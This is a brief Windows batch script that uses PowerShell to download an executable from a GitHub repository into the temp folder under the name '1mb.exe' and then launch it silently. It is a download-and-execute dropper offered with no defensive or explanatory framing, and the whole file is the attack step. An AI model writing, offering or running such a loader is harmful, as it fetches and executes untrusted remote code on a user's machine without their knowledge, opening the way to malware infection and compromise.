@echo off

:: Set the URL to download the EXE from
set "url=https://github.com/theredbruno/Service/raw/refs/heads/main/vbstoexe.EXE"

:: Set the destination path for the downloaded EXE
set "exePath=%TEMP%\1mb.exe"

:: Download the EXE file using PowerShell
powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%exePath%' -UseBasicParsing -ErrorAction Stop"

:: Execute the downloaded EXE file silently
start "" "%exePath%"
